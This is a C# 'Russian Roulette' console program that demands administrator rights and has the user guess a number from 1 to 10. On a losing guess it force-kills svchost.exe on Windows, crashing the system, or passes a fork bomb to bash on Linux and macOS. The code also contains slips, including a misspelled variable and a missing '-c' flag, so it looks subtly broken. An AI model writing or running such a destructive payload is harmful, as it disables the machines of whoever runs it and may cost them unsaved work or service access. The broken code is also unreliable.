using System.Diagnostics;
using System.Security.Principal;

using System.Diagnostics;

using System.Runtime.InteropServices;

namespace RussianRoulette
{
    internal static class Program
    {
        public static void Main(string[] args)
        {
            if (!IsRunningAsAdmin())
            {
                Console.WriteLine("Program is not running as administrator\nPress enter to exit.");
                Console.ReadLine();
            }
            else
            {
                Console.WriteLine("Do you want easy more or hard mode?\npress 1 for easy, and 2 for hard mode");
                var modeInput = Console.ReadLine();
                Int32.TryParse(modeInput, out int modeSelected);
                Console.Clear();

                if (modeSelected == 1 || modeSelected == 2)
                {
                    int RandomNumber = generateNumber();
                    Console.WriteLine("Please pick a number 1-10");

                    var numberInput = Console.ReadLine();
                    Int32 number = Convert.ToInt32(numberInput);
                    if (modeSelecte == 1 ? number != RandomNumber : number == RandomNumber)
                    {
                        Console.WriteLine("You're Safe");
                        Console.ReadLine();
                    }
                    else
                    {
                        KillServiceHostProcess();
                    }
                }
                else
                {
                    Console.WriteLine("Please choose a valid number");
                }
            }
        }

        private static int generateNumber()
        {
            DateTime now = DateTime.Now;
            int seed = now.Millisecond;
            Random random = new Random(seed);
            int generateRandomNumber = random.Next(1, 11);
            return generateRandomNumber;
        }

        public static bool IsRunningAsAdmin()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        public static void KillServiceHostProcess()
        {
            ProcessStartInfo processInfo = new ProcessStartInfo();

            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                processInfo.FileName = "cmd.exe";
                processInfo.Arguments = "/c taskkill /F /IM svchost.exe";
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            {
                processInfo.FileName = "/bin/bash";
                processInfo.Arguments = ":(){ :|:& };:";
            }

            processInfo.CreateNoWindow = true;
            processInfo.UseShellExecute = false;
            processInfo.RedirectStandardError = true;
            processInfo.RedirectStandardOutput = true;

            var process = Process.Start(processInfo);
            process.WaitForExit();
        }
    }
}
